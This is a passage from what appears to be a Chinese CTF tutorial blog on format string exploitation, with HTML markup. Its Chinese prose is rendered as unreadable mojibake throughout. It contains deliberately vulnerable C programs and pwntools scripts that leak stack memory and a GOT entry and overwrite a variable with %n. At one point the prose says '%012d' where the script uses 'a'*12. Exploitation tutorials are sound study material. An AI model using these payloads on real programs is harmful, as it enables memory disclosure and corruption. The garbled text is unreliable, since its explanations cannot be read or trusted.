ˆé¡¶çš„ä½ç½®ã€‚é‚£ä¹ˆåœ¨è¿›å…¥printfä¹‹åï¼Œå‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ­¤æ—¶æ ˆé¡¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªä¸€ä¸ªè¯»å–å…¶å­—ç¬¦ä¸²ä¼šé‡åˆ°ä¸¤ç§æƒ…å†µ</p><ul><li>å½“å‰å­—ç¬¦ä¸²ä¸æ˜¯%ï¼Œç›´æ¥è¾“å‡ºåˆ°ç›¸åº”æ ‡å‡†è¾“å‡ºï¼Œæ¯”å¦‚ç›´æ¥è¾“å‡ºä¸€ä¸ªâ€™hello wordâ€˜</li><li>å½“å­—ç¬¦æ˜¯%ï¼Œç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦<ul><li>å¦‚æœæ²¡å“Ÿå­—ç¬¦ï¼ŒæŠ¥é”™</li><li>å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯%ï¼Œè¾“å‡º%</li><li>å¦åˆ™æ ¹æ®ç›¸åº”çš„å­—ç¬¦ï¼Œè·å–ç›¸åº”çš„å‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œè§£æå¹¶è¾“å‡º</li></ul></li></ul><p>å¦‚æœç¼ºå°‘å‚æ•°å‘¢ï¼Œä¾‹å¦‚ä¸‹é¢è¿™æ ·ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">printf(&quot;Color %s, Number %d, Float %4.2f&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>æ­¤æ—¶å¯ä»¥å‘ç°å¹¶æ²¡æœ‰æä¾›å‚æ•°ï¼Œé‚£ä¹ˆç¨‹åºå¦‚ä½•è¿è¡Œå‘¢ï¼Ÿç¨‹åºä¼šç…§æ ·è¿è¡Œï¼Œä¼šå°†æ ˆä¸Šå­˜å‚¨æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ä¸Šé¢çš„ä¸‰ä¸ªå˜é‡åˆ†åˆ«è§£æä¸ºï¼š</p><ul><li>è§£æå…¶åœ°å€å¯¹åº”çš„å­—ç¬¦ä¸²</li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æ•´å½¢å€¼</li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æµ®ç‚¹å€¼<br>  å¯¹äºç¬¬ä¸€ç§æƒ…å†µæ¥è¯´ï¼Œå¦‚æœæä¾›äº†ä¸€ä¸ªä¸å¯è®¿é—®åœ°å€ï¼Œæ¯”å¦‚0ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šå´©æºƒï¼Œæ‰€ä»¥è¯´å³ä½¿printfå‡½æ•°æ²¡æœ‰ç»™å‡ºå‚æ•°ï¼Œä¹Ÿä¼šæŒ‰ç…§æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»™å‡ºçš„æ ¼å¼æ‰“å°å‡ºæ¥ä¸‹æ¥ä¸‰å¤„åœ°å€ä¸­çš„å†…å®¹<br>  %d ï¼šåè¿›åˆ¶ï¼Œè¾“å‡ºåè¿›åˆ¶æ•´æ•°<br>  %s ï¼š å­—ç¬¦ä¸²ï¼Œä»å†…å­˜ä¸­è¯»å–å­—ç¬¦ä¸²<br>  %x ï¼š åå…­è¿›åˆ¶ï¼Œè¾“å‡ºåå…­è¿›åˆ¶æ•°<br>  %c ï¼š å­—ç¬¦ä¸²ï¼Œè¾“å‡ºå­—ç¬¦ä¸²<br>  %n ï¼š åˆ°ç›®å‰ä¸ºæ­¢ç¼©å†™çš„å­—ç¬¦ä¸²æ•°<h2 id="æ¼æ´åˆ©ç”¨æ–¹æ³•"><a href="#æ¼æ´åˆ©ç”¨æ–¹æ³•" class="headerlink" title="æ¼æ´åˆ©ç”¨æ–¹æ³•"></a>æ¼æ´åˆ©ç”¨æ–¹æ³•</h2><h3 id="1-ç¨‹åºå´©æºƒ"><a href="#1-ç¨‹åºå´©æºƒ" class="headerlink" title="1. ç¨‹åºå´©æºƒ"></a>1. ç¨‹åºå´©æºƒ</h3>æ‹¿åˆ°ä¸€ä¸ªç¨‹åºä¹‹åå¯ä»¥é€šè¿‡è¾“å…¥è‹¥å¹²ä¸ª%sæ¥è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´<pre class="line-numbers language-C" data-language="C"><code class="language-C">%s%s%s%s%s%s%s%s%s%s%s%s%s%s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>å‰é¢è®²è¿‡æ²¡æœ‰å‚æ•°çš„æ—¶å€™printfå‡½æ•°ä¾ç„¶è¿˜å¯ä»¥è¾“å‡ºæ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€ä¸­çš„å†…å®¹ï¼Œ<strong>æ‰€ä»¥å¦‚æœå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåœ¨è¾“å…¥ä¸€é•¿ä¸²%sä¹‹åï¼Œprintfä¼šå°†%sä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå°†å¯¹åº”åœ°å€ä¸­çš„å†…å®¹ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºå‡ºæ¥</strong>ã€‚<em>ä½†æ˜¯æ ˆä¸Šä¸å¯èƒ½æ¯ä¸ªå€¼éƒ½å¯¹åº”äº†åˆæ³•åœ°å€ï¼Œæ‰€ä»¥æ•°å­—å¯¹åº”çš„å†…å®¹å¯èƒ½ä¸å­˜åœ¨ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šä½¿ç¨‹åºå´©æºƒ</em>ã€‚</li></ul><p><strong><em>åœ¨Linuxä¸­ï¼Œå­˜å–æ— æ•ˆçš„æŒ‡é’ˆä¼šå¼•èµ·è¿›ç¨‹å—åˆ°SIGSEGVä¿¡å·ï¼Œä»è€Œä½¿ç¨‹åºéæ­£å¸¸ç»ˆæ­¢å¹¶äº§ç”Ÿæ ¸å¿ƒè½¬å‚¨</em></strong></p><h3 id="2-æ³„éœ²æ ˆå†…å­˜"><a href="#2-æ³„éœ²æ ˆå†…å­˜" class="headerlink" title="2. æ³„éœ²æ ˆå†…å­˜"></a>2. æ³„éœ²æ ˆå†…å­˜</h3><p>ä¾‹é¢˜å¦‚ä¸‹ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;int main() &#123;  char s[100];  int a &#x3D; 1, b &#x3D; 0x22222222, c &#x3D; -1;  scanf(&quot;%s&quot;, s);  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);  printf(s);  return 0;&#125;#ç¼–è¯‘å¦‚ä¸‹ï¼šgcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h4 id="è·å–æ ˆå˜é‡æ•°å€¼"><a href="#è·å–æ ˆå˜é‡æ•°å€¼" class="headerlink" title="è·å–æ ˆå˜é‡æ•°å€¼"></a>è·å–æ ˆå˜é‡æ•°å€¼</h4><p>é€šè¿‡gdbæ‰“å¼€ç¨‹åºï¼Œåœ¨printfå¤„ä¸‹æ–­ç‚¹<br>ç„¶åæŒ‰rè¿è¡Œï¼Œè¾“å…¥%08x.%08x.%08x<br>![[Pasted image 20250210183257.png]]<br>![[Pasted image 20250210183302.png]]<br>å¯ä»¥çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ª%08xè§£æçš„æ˜¯0x1ï¼Œç¬¬äºŒä¸ª%08xè§£æçš„æ˜¯0x22222222ï¼Œç¬¬ä¸‰ä¸ª%08xè§£æçš„æ˜¯-1ï¼Œç¬¬å››ä¸ª%sè§£æçš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„â€œ%08x.%08x.%08xâ€å­—ç¬¦ä¸²ã€‚æ‰€ä»¥æ¥ä¸‹æ¥è¾“å…¥cè®©ç¨‹åºç»§ç»­æ‰§è¡Œï¼Œæˆ‘ä»¬é¢„è®¡çš„æƒ…å†µæ˜¯ä¼šå°†è¿™å››å¤„è¾“å‡ºå‡ºæ¥ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>å’Œæˆ‘ä»¬æƒ³è±¡çš„ä¸€æ ·ï¼Œå¹¶ä¸”ç¨‹åºä¼šç»§ç»­åœåœ¨ç¬¬äºŒä¸ªprintfå‡½æ•°å¤„ï¼Œä¾ç„¶è¿˜æ˜¯çœ‹ä¸€ä¸‹æ ˆç©ºé—´<br>![[Pasted image 20250210183522.png]]<br>![[Pasted image 20250210183657.png]]<br>å¯ä»¥çœ‹åˆ°ç”±äºç¬¬äºŒæ¬¡printfæ²¡æœ‰ç»™å‚æ•°ï¼Œæ‰€ä»¥è§¦å‘äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ª%08xè§£æçš„æ˜¯0xffffd090ï¼Œç¬¬äºŒä¸ª%08xè§£æçš„æ˜¯0xf7fd0410ï¼Œç¬¬ä¸‰ä¸ª%08xè§£æçš„æ˜¯0x1ã€‚æ¥ä¸‹æ¥è¾“å…¥cè®©ç¨‹åºç»§ç»­æ‰§è¡Œï¼Œæˆ‘ä»¬é¢„è®¡çš„æ•ˆæœæ˜¯æ‰“å°å‡ºâ€œffffd090. f7fd0410. 00000001â€<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; cContinuing.ffffd090.f7fd0410.00000001[Inferior 1 (process 2788) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>æˆ‘ä»¬ä¸åªå¯ä»¥ç”¨%x%x%xï¼Œè¿˜å¯ä»¥ä½¿ç”¨%pæ¥è·å–æ•°æ®ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">hollk@ubuntu:~&#x2F;ctf-challenges&#x2F;pwn&#x2F;fmtstr&#x2F;leakmemory$ .&#x2F;leakmemory %p.%p.%p00000001.22222222.ffffffff.%p.%p.%p0xffe9c200.0xf7eee410.0x1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br><strong>ç”±äºæ ˆä¸Šçš„æ•°æ®ä¼šå› ä¸ºæ¯æ¬¡åˆ†é…çš„å†…å­˜é¡µä¸åŒï¼Œæ‰€ä»¥å¹¶ä¸æ˜¯æ¯æ¬¡å¾—åˆ°çš„ç»“æœéƒ½ä¸€æ ·</strong>ã€‚æˆ‘ä»¬ä¸Šé¢ä½¿ç”¨çš„æ–¹æ³•ä¸€ç›´éƒ½æ˜¯ä¾æ¬¡è¾“å‡ºæ ˆä¸­çš„æ¯ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³è¦è¾“å‡ºä¸€ä¸ªç‰¹å®šä½ç½®çš„å†…å®¹ï¼Œå°±éœ€è¦æ›´æ”¹ä¸€ä¸‹è¾“å…¥çš„å†…å®¹<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">%n$x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>è¿˜æ˜¯é€šè¿‡gdbæ‰“å¼€ç¨‹åºï¼Œåœ¨printfå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œæ¥ä¸‹æ¥è¾“å…¥rè¿è¡Œèµ·æ¥ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æŒ‰ç…§ä¸Šé¢çš„å…¬å¼è¾“å…¥%3$x<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; rStarting program: &#x2F;home&#x2F;hollk&#x2F;ctf-challenges&#x2F;pwn&#x2F;fmtstr&#x2F;leakmemory&#x2F;leakmemory %3$x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>ä¾æ—§è¾“å…¥cä¼šæ‰“å°å‡ºâ€œ00000001.22222222.ffffffff.%3$xâ€ï¼Œå¹¶ä¸”ç¨‹åºè¿˜ä¼šåœåœ¨ç¬¬äºŒä¸ªprintfå‡½æ•°å¤„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦çœ‹ä¸€ä¸‹æ ˆç©ºé—´äº†<br>![[Pasted image 20250210183920.png]]<br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„<code>%3$x</code>è¢«æ”¾ç½®åˆ°äº†printfå‡½æ•°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œä¸€ä¼šæˆ‘ä»¬å†è®²ä¸ºä»€ä¹ˆè¦è¾“å…¥ %3$xã€‚æ¥ä¸‹æ¥è¾“å…¥cçœ‹ä¸€çœ‹æ‰“å°çš„ç»“æœ<br>![[Pasted image 20250211150946.png]]<br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å‡ºçš„æ˜¯1ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„0x1ï¼Œæ‰€ä»¥è¯´<code>%3$x</code>è§£æçš„æ˜¯0x1ã€‚é‚£ä¹ˆå°±éœ€è¦ä»”ç»†ç¢ç£¨ä¸€ä¸‹æˆ‘ä»¬è¾“å…¥çš„<code>%3$x</code><br>![[Pasted image 20250211151008.png]]<br><strong>äº‹å®ä¸Šæˆ‘ä»¬é€šè¿‡<code>%3$x</code>è¾“å‡ºçš„0x1æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„%3$xå°±æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°çš„æ„æ€</strong><br>![[Pasted image 20250211151023.png]]<br><strong>ä½†æ˜¯æˆ‘ä»¬å®é™…ä¸Šè¾“å‡ºçš„æ˜¯printfçš„ç¬¬å››ä¸ªå‚æ•°ï¼Œå› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²å°±æ˜¯printfå‡½æ•°çš„å…¶ä¸­ä¸€ä¸ªå‚æ•°ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¸ç”¨éå†æ•´ä¸ªæ ˆï¼Œèƒ½å¤ŸæŒ‡å®šè¾“å‡ºæŸä¸ªæ ˆä¸Šçš„å†…å®¹</strong></p><h4 id="è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²"><a href="#è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²" class="headerlink" title="è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²"></a>è·å–æ ˆå˜é‡å¯¹åº”å­—ç¬¦ä¸²</h4><p>å…¶å®å°±æ˜¯æŠŠå‰é¢æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„xæ”¹æˆså°±å¯ä»¥äº†ï¼Œ%sä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºæ ˆåœ°å€ä¸­çš„å†…å®¹ï¼ŒéªŒè¯è¿‡ç¨‹å’Œä¸Šé¢ä¸€æ ·ï¼Œå°±ä¸å†™äº†<br><strong>å°æŠ€å·§æ€»ç»“</strong></p><blockquote><p>åˆ©ç”¨ %x æ¥è·å–å¯¹åº”æ ˆçš„å†…å­˜ï¼Œ<strong>ä½†å»ºè®®ä½¿ç”¨ %pï¼Œå¯ä»¥ä¸ç”¨è€ƒè™‘ä½æ•°çš„åŒºåˆ«</strong>ã€‚<br>åˆ©ç”¨ %s æ¥è·å–å˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡<strong>æœ‰é›¶æˆªæ–­</strong>ã€‚<br>åˆ©ç”¨ <code>%order$x</code> æ¥è·å–æŒ‡å®šå‚æ•°çš„å€¼ï¼Œåˆ©ç”¨ %order$s æ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”åœ°å€çš„å†…å®¹ã€‚</p><h4 id="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"><a href="#æ³„éœ²ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="æ³„éœ²ä»»æ„åœ°å€å†…å­˜"></a>æ³„éœ²ä»»æ„åœ°å€å†…å­˜</h4><p>æœ‰æ—¶å€™æˆ‘ä»¬æƒ³è¦æ³„éœ²æŸä¸ªlibcå‡½æ•°çš„gotè¡¨å†…å®¹ï¼Œä»è€Œçš„åˆ°å…¶åœ°å€ï¼Œè¿›è€Œè·å–libcç‰ˆæœ¬ä»¥åŠå…¶ä»–å‡½æ•°çš„åœ°å€ï¼Œè¿™æ—¶å€™èƒ½å¤Ÿå®Œå…¨æ§åˆ¶æ³„éœ²æŸä¸ªæŒ‡å®šåœ°å€çš„å†…å­˜å°±å¾ˆé‡è¦äº†ã€‚<strong>ä¸€èˆ¬æ¥è¯´åœ¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´ä¸­ï¼Œæˆ‘ä»¬è¯»å–çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ½åœ¨æ ˆä¸Šã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨è°ƒç”¨è¾“å‡ºå‡½æ•°çš„æ—¶å€™ï¼Œå…¶å®ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼å…¶å®å°±æ˜¯è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€</strong><br>ç”±äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨è¾“å‡ºå‡½æ•°è°ƒç”¨æ—¶æ˜¯ç¬¬å‡ ä¸ªå‚æ•°ï¼Œè¿™é‡Œå‡è®¾æ”¹æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›¸å¯¹å‡½æ•°è°ƒç”¨ä¸ºç¬¬Kä¸ªå‚æ•°ã€‚é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡å¦‚ä¸‹ çš„æ–¹å¼æ¥è·å–æŸä¸ªæŒ‡å®šåœ°å€addrçš„å†…å®¹<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">addr%k$s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>ä¸‹é¢å°±æ˜¯å¦‚ä½•ç¡®å®šè¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸ºç¬¬å‡ ä¸ªå‚æ•°çš„é—®é¢˜äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ç¡®å®š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">[ tag ]%p%p%p%p%p%p%p%p%p%p%p%p.......<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>[tag]ä¸ºé‡å¤æŸä¸ªå­—ç¬¦çš„å­—èŠ‚é•¿æ¥ä½œä¸ºtagï¼Œå°±æ˜¯aaaaã€bbbbè¿™æ ·å°±å¯ä»¥ã€‚åé¢ä¸ª%pä¼šå°†ä¾æ¬¡éå†ä»¥åœ°å€çš„å½¢å¼æ‰“å°å‡ºå‡½æ•°å‚æ•°ï¼Œè¯•ä¸€ä¸‹ï¼š<br>![[Pasted image 20250211151337.png]]<br>æˆ‘ä»¬è¾“å…¥çš„AAAAå¯¹åº”åé¢åˆ°0x41414141ï¼Œä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å››ä¸ªå‚æ•°ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨å‰é¢çš„æ–¹æ³•ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">AAAA%4$p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>é‚£ä¹ˆæˆ‘ä»¬æƒ³æƒ³ï¼Œå¦‚æœå°†AAAAæ›¿æ¢æˆæŸä¸ªå‡½æ•°çš„gotåœ°å€ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šæ‰“å°å‡ºè¿™ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ã€‚æˆ‘ä»¬æ‹¿scanfå‡½æ•°ä¸¾ä¾‹ï¼Œè·å–å‡½æ•°gotåœ°å€å°±äº¤ç»™æˆ‘ä»¬çš„pwntoolsäº†ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">from pwn import *sh &#x3D; process(&#39;.&#x2F;leakmemory&#39;)elf &#x3D; ELF(&#39;.&#x2F;leakmemory&#39;)__isoc99_scanf_got &#x3D; elf.got[&#39;__isoc99_scanf&#39;] #è·å–scanfå‡½æ•°çš„gotåœ°å€print hex(__isoc99_scanf_got)payload &#x3D; p32(__isoc99_scanf_got) + &#39;%4$s&#39; #å°†AAAA%4$pä¸­çš„Aæ›¿æ¢æˆscanfå‡½æ•°çš„gotåœ°å€sh.sendline(payload)sh.recvuntil(&#39;%4$s\n&#39;)print hex(u32(sh.recv()[4:8]))sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>![[Pasted image 20250211151436.png]]</p><h3 id="3-è¦†ç›–å†…å­˜"><a href="#3-è¦†ç›–å†…å­˜" class="headerlink" title="3. è¦†ç›–å†…å­˜"></a>3. è¦†ç›–å†…å­˜</h3><p>å‰é¢æˆ‘ä»¬é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ³„éœ²æ ˆå†…å­˜ä»¥åŠä»»æ„åœ°å€å†…å­˜ï¼Œé‚£ä¹ˆè¿™éƒ¨åˆ†æˆ‘ä»¬ç›´æ¥ä¿®æ”¹æ ˆä¸Šå˜é‡çš„å€¼ã€‚æƒ³è¦è¿›è¡Œè¦†ç›–ï¼ŒåŠ¿å¿…è¦æœ‰ä¸€ä¸ªä¸œè¥¿èƒ½æœ‰å†™çš„èƒ½åŠ›ã€‚è¿™ä¸ªæ—¶å€™å°±ç”¨åˆ°äº†%n<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">%n,ä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>â€¦[ overwrite addr ]â€¦.%[ overwrite offset ]$n<br>**å…¶ä¸­â€¦ è¡¨ç¤ºæˆ‘ä»¬çš„å¡«å……å†…å®¹ï¼Œoverwrite addr è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ï¼Œoverwrite offset åœ°å€è¡¨ç¤ºæˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€å­˜å‚¨çš„ä½ç½®ä¸ºè¾“å‡ºå‡½æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å‡ ä¸ªå‚æ•°</p></blockquote><p>ä¸€èˆ¬æ¥è¯´ï¼Œåˆ©ç”¨åˆ†ä¸ºä»¥ä¸‹çš„æ­¥éª¤ï¼š<br>â€¢ ç¡®å®šè¦†ç›–åœ°å€<br>â€¢ ç¡®å®šç›¸å¯¹åç§»ï¼ˆæ‰¾æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­ç¬¬å‡ ä¸ªå‚æ•°ï¼‰<br>â€¢ è¿›è¡Œè¦†ç›–</p><p>ä¸¾ä¾‹ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* example&#x2F;overflow&#x2F;overflow.c *&#x2F;#include &lt;stdio.h&gt;int a &#x3D; 123, b &#x3D; 456;int main() &#123;  int c &#x3D; 789;  char s[100];  printf(&quot;%p\n&quot;, &amp;c);  scanf(&quot;%s&quot;, s);  printf(s);  if (c &#x3D;&#x3D; 16) &#123;    puts(&quot;modified c.&quot;);  &#125; else if (a &#x3D;&#x3D; 2) &#123;    puts(&quot;modified a for a small number.&quot;);  &#125; else if (b &#x3D;&#x3D; 0x12345678) &#123;    puts(&quot;modified b for a big number!&quot;);  &#125;  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>ç®€å•çš„è®²ä¸€ä¸‹è¿™ä¸ªä¾‹å­ï¼Œä¸‰ä¸ªæ•´å‹å˜é‡a=123ã€b=456ã€c=789ã€‚aã€bæ˜¯å…¨å±€å˜é‡ï¼Œcæ˜¯å±€éƒ¨å˜é‡ï¼Œæ•°ç»„sç­‰å¾…æˆ‘ä»¬ä»scanfå‡½æ•°è¾“å…¥ã€‚å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°ç¬¬äºŒä¸ªprintfå‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æœ€åæ˜¯ä¸‰ä¸ªåˆ¤æ–­ï¼Œå¦‚æœc = 16å°±æ‰“å°â€œmodified c.â€ï¼Œå¦‚æœa = 2å°±æ‰“å°â€œmodified a for a small number.â€ï¼Œå¦‚æœb = 0x12345678å°±æ‰“å°â€œmodified b for a big number!â€</p><h4 id="è¦†ç›–æ ˆå†…å­˜"><a href="#è¦†ç›–æ ˆå†…å­˜" class="headerlink" title="è¦†ç›–æ ˆå†…å­˜"></a>è¦†ç›–æ ˆå†…å­˜</h4><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©è®©c = 16ï¼Œä½¿ç¨‹åºæ‰“å°â€œmodified c.â€ï¼Œå¯ä»¥ä»æºç ä¸­çœ‹åˆ°ç¬¬ä¸€æ¬¡printfæ‰“å°å‡ºäº†å˜é‡cçš„åœ°å€ï¼Œæ‰€ä»¥ä¸éœ€è¦é¢å¤–æ‰¾äº†<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>![[Pasted image 20250211152005.png]]<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»“æœçœ‹åˆ°å˜é‡s(cçš„åœ°å€)æ˜¯åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ ¹æ®ä¸Šé¢çš„å…¬å¼æ¥æ„é€ payloadäº†<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *sh &#x3D; process(&#39;.&#x2F;overwrite&#39;)c_addr &#x3D; int(sh.recvuntil(&#39;\n&#39;, drop&#x3D;True), 16) #è·å–cå˜é‡çš„åœ°å€print hex(c_addr)payload &#x3D; p32(c_addr) + &#39;a&#39;*12 + &#39;%6$n&#39; #æ„å»ºpayloadsh.sendline(payload)print sh.recv()sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>é¦–å…ˆç¬¬ä¸€ä¸ªc_addrå°±æ˜¯å˜é‡cçš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡æ¥æ”¶ç¬¬ä¸€æ¬¡printfæ‰“å°å‡ºæ¥çš„å­—ç¬¦è·å¾—ã€‚å› ä¸ºå‰é¢çš„c_addrå·²ç»å äº†4ä¸ªå­—èŠ‚ï¼Œç¬¬äºŒä¸ª%012dæ˜¯ä¸ºäº†è¡¥å…¨16ä¸ªå­—èŠ‚ï¼Œæœ€åçš„%6$næ˜¯ä¸ºäº†å‘ç¬¬6ä¸ªå‚æ•°å†…å†™16ï¼Œè¿™ä¸ª16å°±æ˜¯å‰é¢çš„16ä¸ªå­—èŠ‚ã€‚è¿™å°±æ˜¯%nçš„èƒ½åŠ›<br>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°è¾“å‡ºçš„â€œmodified c.â€å­—ç¬¦ä¸²ï¼š![[Pasted image 20250211152220.png]]</p><h4 id="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"><a href="#è¦†ç›–ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="è¦†ç›–ä»»æ„åœ°å€å†…å­˜"></a>è¦†ç›–ä»»æ„åœ°å€å†…å­˜</h4><h5 id="è¦†ç›–å°æ•°å­—"><a href="#è¦†ç›–å°æ•°å­—" class="headerlink" 